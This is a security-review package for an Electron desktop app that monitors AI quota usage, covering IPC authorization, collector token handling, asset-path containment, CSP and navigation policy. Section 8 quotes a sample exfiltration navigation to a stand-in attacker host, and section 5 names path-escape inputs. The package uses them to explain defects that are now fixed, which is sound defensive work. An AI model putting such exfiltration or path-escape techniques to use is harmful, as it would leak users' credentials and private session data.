# QuotaOps desktop (Electron + IPC) — package for an independent human security reviewer

**Date:** 19 October 2026
**Subject:** PR #35, branch `desktop/architecture-benchmark`, head `716052f`
**Status of this request:** mandatory release gate. The desktop build does not ship without it.

An AI-assisted adversarial review has already run against this code and found
six confirmed defects, two of them in the implementer's own tests. All are
fixed. **That review is not this one.** It removes anchoring on the
implementer's conclusions; it does not remove shared blind spots, and it is
not human sign-off.

**A previous review approved a different architecture.** That one covered a
loopback HTTP dashboard with a capability token. This transport is not that
one and cannot inherit its approval.

---

## 1. What the product does

QuotaOps monitors AI provider quota usage (Claude, OpenAI) and local AI
runtimes. It runs entirely on the user's Windows machine. There is no QuotaOps
backend, no hosted database and no account system.

**Assets:** provider browser cookies and access tokens; local session-history
files, which contain prompts, responses and source code; the collector bearer
token; quota metadata.

**Attacker classes in scope:**

| Class | Why it matters here |
|---|---|
| Compromised or injected renderer | A frontend supply-chain compromise or any XSS in the dashboard |
| Malicious local process, same Windows user | Accepted as out of scope by the owner (Risk A), but its *reach* is in scope |
| Hostile peer on `127.0.0.1:4317` | Nothing authenticates the collector socket |
| Hostile file placed in or beside the app directory | Affects the asset protocol and the CSP manifest |
| Network attacker | Should have no surface at all in this architecture — please confirm |

---

## 2. Architecture

```
  +-------------------- Electron main process --------------------+
  |                                                               |
  |  reads %USERPROFILE%\.quotaops\collector.token                |
  |            |                                                  |
  |            v                                                  |
  |  fetch http://127.0.0.1:4317/snapshot   (Bearer <token>)      |
  |            |                                                  |
  |            v                                                  |
  |  readBoundedBody -> JSON.parse -> projectSnapshot             |
  |            |                                                  |
  |  ipcMain.handle("quotaops:snapshot")                          |
  |            |                                                  |
  +------------|--------------------------------------------------+
               | contextBridge, one read-only call
  +------------v--------------------------------------------------+
  |  Renderer: sandbox, contextIsolation, nodeIntegration false   |
  |  UI served from app://quotaops/  (static Next.js export)      |
  |  CSP: connect-src 'none'; script-src 'self' + 3 sha256 hashes |
  +---------------------------------------------------------------+

  Separate process, unchanged by this work:
  Collector -> Playwright Chrome/Edge -> provider sites
```

**There is no dashboard HTTP listener.** That is the central claim to test.

### Files

| File | Role |
|---|---|
| `desktop/electron-ipc/main.js` | Shell, protocol handler, IPC handler, session hardening, tray |
| `desktop/electron-ipc/preload.js` | The entire privileged surface |
| `desktop/electron-ipc/security.js` | Containment, URL policy, sender identity, bounded reads, CSP, snapshot projection |
| `desktop/build-static.mjs` | Static export and CSP hash manifest |
| `lib/collector-transport.ts` | Transport selection (IPC vs HTTP) |
| `lib/collector-client.ts` | Payload validation in the renderer |
| `collector/security.ts`, `collector/service.ts` | Collector token and HTTP surface |

---

## 3. The IPC channel specification

One channel. `quotaops:snapshot`, invoke/handle, no arguments, no `ipcMain.on`.

The preload exposes exactly:

```js
contextBridge.exposeInMainWorld("quotaops", {
  version: 1,
  getSnapshot: () => ipcRenderer.invoke("quotaops:snapshot"),
});
```

**Authorization** (`isTrustedIpcSender`): the sender's `webContents.id` must
match the one recorded when the window was created; the sender must not be
destroyed; `senderFrame` must be present, must have no parent, and its
scheme+host must equal `app://quotaops`.

Two details worth your attention:

- `URL.origin` is the string `"null"` for a custom scheme. Comparing origins
  would reject the application's own frame and accept any other
  custom-scheme frame. The first version did exactly that.
- `senderFrame` is documented as nullable once a frame has navigated or been
  destroyed. An earlier version wrapped the parent and origin checks in
  `if (frame)` with no `else`, so a null frame skipped both and left only the
  WebContents id — which every frame in a window shares.

**Rate limiting:** one request per second, and concurrent calls share a single
in-flight promise.

**Question for you:** is identity-by-`webContents.id` sufficient given the
window is created once and `close` hides rather than destroys? What breaks if
a second window, a `<webview>`, or `nodeIntegrationInSubFrames` is added
later?

---

## 4. Collector authentication

Unchanged by this work, and worth assessing in its new context.

- Token: 256-bit CSPRNG, base64url, validated `^[A-Za-z0-9_-]{43}$`,
  compared with `timingSafeEqual` under a length guard.
- Stored at `%USERPROFILE%\.quotaops\collector.token`, created with `wx` and
  mode 0600; on Windows the protection is ACL inheritance from `.quotaops`.
- The collector refuses any request carrying an `Origin` header, and requires
  `Host` to equal `127.0.0.1:4317` exactly.

**Nothing authenticates the peer.** A local process that binds 4317 first
receives the bearer token — twice, because a 401 triggers a token re-read and
one retry. That is not an escalation, since the same user can read the token
file directly, but it means **an impersonating peer controls the renderer's
entire input**. §6 is the mitigation.

**Question for you:** should the main process verify it is talking to the real
collector before sending the token, and is there a practical way to do so on
loopback without a second secret?

---

## 5. Static asset protocol

`app://quotaops/<path>` serves the exported bundle. `resolveStaticAsset`:

1. `decodeURIComponent`, refusing malformed encoding.
2. Refuse NUL bytes.
3. Refuse any `:` — NTFS alternate data streams (`index.html::$DATA`) resolve
   to real files and `realpath` preserves the suffix, so the escape check
   cannot see past them.
4. Refuse absolute and drive-qualified paths.
5. Resolve against the bundle root; containment by `path.relative`, **not**
   `startsWith` — `C:\app\static-dist-evil\x` passes a prefix test against
   `C:\app\static-dist`.
6. `realpath` both ends and re-check, which catches symlinks and Windows
   directory junctions.
7. A missing file is allowed through as `exists: false` so the caller can
   serve the entry document for client-side routing; it is still contained.

**Question for you:** 8.3 short names, UNC and `\\?\` device paths, trailing
dots and spaces, unicode normalisation. The AI review tried these and found no
escape; a second pass is worth it.

---

## 6. Snapshot validation schema

`projectSnapshot` rebuilds the payload field by field. Nothing from the
collector reaches the renderer except these fields, truncated:

| Field | Bound |
|---|---|
| `generatedAt` | 64 chars |
| `accounts` | 64 entries |
| `accounts[].id`, `.checkedAt` | 64 chars |
| `accounts[].label` | 128 chars |
| `accounts[].status` | 32 chars |
| `accounts[].message` | 512 chars |
| `account.windows` | 16 entries |
| `window.usedPercent` | finite number or `null` |
| `tokens` | object or `null`, re-validated by the client parser |

Unknown keys are dropped. Non-strings become `null`.

React escapes text and there is no `dangerouslySetInnerHTML` anywhere, so this
is not an XSS fix. It bounds what an impersonating peer can place in front of
the user.

---

## 7. Effective CSP

Measured on the running app, not read from configuration:

```
default-src 'self';
script-src 'self' 'sha256-...' 'sha256-...' 'sha256-...';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:; font-src 'self';
connect-src 'none'; media-src 'self' blob:;
object-src 'none'; base-uri 'none'; form-action 'none';
frame-ancestors 'none'; worker-src 'self'
```

Delivered by `webRequest.onHeadersReceived`. **Whether that fires for
`protocol.handle` responses was an open question**, and if it did not, every
CSP claim here would be fiction. It fires — verified in the renderer:

```json
{"connect":"BLOCKED:TypeError: Failed to fetch","inlineScript":"BLOCKED","metaCsp":"absent"}
```

`scripts/desktop-shell-smoke.ts` asserts this on every run.

The three script hashes are the inline bootstrap scripts Next emits, recorded
at build time. A missing manifest yields a **stricter** policy, not a wider
one.

`style-src` keeps `unsafe-inline` because React injects styles at runtime, so
their content is not fixed at build time. With `img-src 'self' data: blob:`,
`font-src 'self'` and `connect-src 'none'`, CSS-injection exfiltration has no
off-box sink — **please challenge that reasoning.**

---

## 8. External navigation

`shell.openExternal` launches whatever handler Windows has registered.

The allowlist (`ALLOWED_EXTERNAL_HOSTS`) is **empty**: the dashboard links
nowhere, so nothing should ever reach it. An earlier version filtered only on
scheme-is-https, which let a compromised renderer exfiltrate a snapshot with
`location.href = "https://attacker.test/?d=" + data` — a top-level navigation
needing no user gesture and no popup permission, straight past
`connect-src 'none'`, driving the user's own browser where the provider
sessions live.

The validated URL is also what gets passed on: `new URL()` strips tabs and
leading whitespace, so validating one spelling and executing another was its
own defect.

**Not covered:** `will-frame-navigate` is unhandled (subframe navigation);
today that is blocked by `default-src 'self'` with no `frame-src`. There is no
`app.on("web-contents-created")` backstop, so a webContents added later
inherits nothing.

---

## 9. Browser session lifecycle

Unchanged by this work; the collector owns it.

Isolated persistent profiles under `%USERPROFILE%\.quotaops\browser-profiles`,
one per account. No `--remote-debugging-port` in the launch arguments.

`scripts/windows-browser-processes.ps1` identifies QuotaOps browsers by their
`--user-data-dir` and reports INCONCLUSIVE rather than zero when a process
cannot be inspected. The earlier check matched the Chrome **executable path**
against `*quotaops*` — which never matched, so it always reported zero.
Measured side by side with eight processes alive: old 0, new 8.

**Unverified:** real authenticated collection. Every browser test is
synthetic. This is the open QO-SEC-03 gate.

---

## 10. Accepted residual risks

Decided by the owner on 15 October 2026.

| Risk | Decision |
|---|---|
| **A** — a process running as the same Windows user reaches the loopback services, the token and the browser profiles | **Accepted** |
| **B** — per-source consent governs what QuotaOps reads, not the files' Windows permissions | **Accepted** |
| **C** — a transparent loopback relay | **Mitigated, not closed** (OS-allocated port). Does not apply to the desktop UI, which has no listener |

---

## 11. Test evidence

`npm test` — **148 tests, 0 failures, 1 skipped** (a symlink fixture needing
Developer Mode; an injected-realpath test carries the same control).

| Area | File |
|---|---|
| Containment, URL policy, IPC identity, CSP, projection | `tests/desktop-ipc-security.test.ts` |
| Report-script false-success paths | `tests/verification-reliability.test.ts` |
| Running shell: IPC round trip, enforced CSP, teardown | `scripts/desktop-shell-smoke.ts` |
| Browser detector sees then stops seeing a browser | `scripts/windows-browser-lifecycle-check.ts` |

**Known test weaknesses, stated rather than hidden:**

- `main.js` has no unit coverage; it needs Electron. The smoke script covers
  the round trip, not every branch. This gap has already produced one runtime
  failure that the unit suite missed entirely.
- The symlink test skips without Developer Mode. A directory junction would
  be the better fixture.

---

## 12. What is being asked

Assess the **implementation**. Specifically:

1. Renderer compromise: with `connect-src 'none'`, an empty external
   allowlist and one read-only IPC call, what exfiltration path remains?
2. IPC authorization: is `webContents.id` plus frame checks sufficient?
3. File disclosure through `app://`.
4. Collector impersonation: §4 and §6.
5. Bearer-token handling: anywhere it could reach the renderer, a log or a
   crash dump. No `crashReporter` is configured.
6. Process isolation and the supervised collector's lifecycle.
7. Packaging and update trust — not yet built; the plan is in §13.
8. Whether anything here is **claimed more strongly than the evidence
   supports**. Two such overclaims have already been found and corrected.

Confirmed critical and high findings will be fixed before merge, not
documented around. Medium and low findings get a tracked disposition with
regression coverage.

---

## 13. Not yet built

- Windows installer, code signing, update channel.
- Background scheduler, pause/resume, notifications.
- Real authenticated E2E (QO-SEC-03).
- Constrained-hardware performance measurement.

These are outside this review's scope but shape it: the IPC surface is what
the installer will ship.
